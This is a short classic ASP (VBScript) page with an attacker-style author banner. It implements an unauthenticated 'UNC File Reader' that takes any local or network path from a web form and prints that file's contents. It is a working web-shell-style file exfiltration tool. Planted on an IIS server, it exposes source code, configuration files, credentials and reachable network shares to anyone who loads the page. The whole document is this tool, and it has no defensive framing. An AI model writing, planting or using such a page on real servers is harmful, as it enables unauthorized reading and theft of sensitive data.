' ##########################################
' ###### Coded by: ARCANGEL0         ######
' #########################################
<%@ Language=VBScript %>
<%
Response.ContentType = "text/html"
%>
<html>
<head>
<title>UNC File Reader</title>
</head>
<body>
<h2>UNC Path File Reader</h2>
<form method="POST">
  <label for="filepath">UNC File Path:</label><br>
  <input type="text" name="filepath" size="80" 
         value="<%= Server.HTMLEncode(Request.Form("filepath")) %>" 
         placeholder="e.g., \\server\share\file.asp"><br>
  <input type="submit" value="Read File">
</form>
<hr>
<%
If Request.Form("filepath") <> "" Then
    On Error Resume Next
    Dim filepath, fileContent
    filepath = Request.Form("filepath")
    
    Response.Write("<h3>Reading: " & Server.HTMLEncode(filepath) & "</h3>")
    
    ' Method: Use FileSystemObject with UNC path
    Dim fso, file, stream
    Set fso = Server.CreateObject("Scripting.FileSystemObject")
    
    ' Check if path exists (UNC requires proper permissions)
    If fso.FileExists(filepath) Then
        ' Read as text file (avoids ASP execution)
        Set stream = Server.CreateObject("ADODB.Stream")
        stream.Open
        stream.Type = 2 ' Text mode
        stream.Charset = "iso-8859-1" ' Adjust if needed
        stream.LoadFromFile(filepath)
        fileContent = stream.ReadText
        stream.Close
        Response.Write("<pre>" & Server.HTMLEncode(fileContent) & "</pre>")
    Else
        Response.Write("<strong>Error:</strong> File not found or access denied.")
    End If
    
    If Err.Number <> 0 Then
        Response.Write("<strong>Error:</strong> " & Server.HTMLEncode(Err.Description))
        Err.Clear
    End If
End If
%>
</body>
</html>
